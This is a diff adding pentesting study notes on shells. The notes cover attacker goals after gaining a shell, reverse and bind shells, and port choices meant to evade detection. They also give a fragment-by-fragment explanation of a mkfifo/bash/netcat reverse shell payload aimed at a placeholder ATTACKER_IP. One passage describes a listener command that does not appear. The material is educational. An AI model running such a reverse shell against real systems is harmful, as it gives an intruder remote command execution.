@@ -137,3 +137,31 @@ Excludes results based on the length of the response body (useful to filter out 
 --follow-redirect
 
 Follows HTTP redirects (useful for cases where subdomains may redirect).
+ # Shell overview
+ A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
+Remote System Control: allows the attacker to execute commands or software remotely in the target system.
+Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
+Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
+Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
+Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
+Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
+A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.
+
+ command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection
+ Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
+
+Explanation of the Payload
+
+rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
+| nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
+>/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+>Bind Shell
+As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
+
+Rlwrap
+
+It is a small utility that uses the GNU readline library to provide editing keyboard and history.
+
